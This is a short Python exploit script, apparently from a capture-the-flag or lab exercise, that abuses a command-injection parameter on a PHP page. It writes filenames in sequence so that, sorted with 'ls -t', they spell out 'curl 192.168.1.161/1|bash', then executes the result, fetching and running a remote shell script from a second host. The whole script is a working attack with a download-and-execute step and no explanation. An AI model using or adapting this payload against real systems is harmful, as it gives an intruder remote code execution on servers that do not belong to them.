#encoding:utf-8
import time
import requests
baseurl = "http://192.168.1.6:19080/class09/3/index.php?cmd="
s = requests.session()

# 将ls -t 写入文件_
list=[
    ">ls\\",
    "ls>_",
    ">\ \\",
    ">-t\\",
    ">\>y",
    "ls>>_"
]

# curl 192.168.1.161/1|bash
list2=[
    ">bash",
    ">\|\\",
    ">\/\\",
    ">61\\",
    ">1\\",
    ">1.\\",
    ">8.\\",
    ">16\\",
    ">2.\\",
    ">19\\",
    ">\ \\",
    ">rl\\",
    ">cu\\"
]
for i in list:
    time.sleep(1)
    url = baseurl+str(i)
    s.get(url)

for j in list2:
    time.sleep(1)
    url = baseurl+str(j)
    s.get(url)

s.get(baseurl+"sh _")
s.get(baseurl+"sh y")

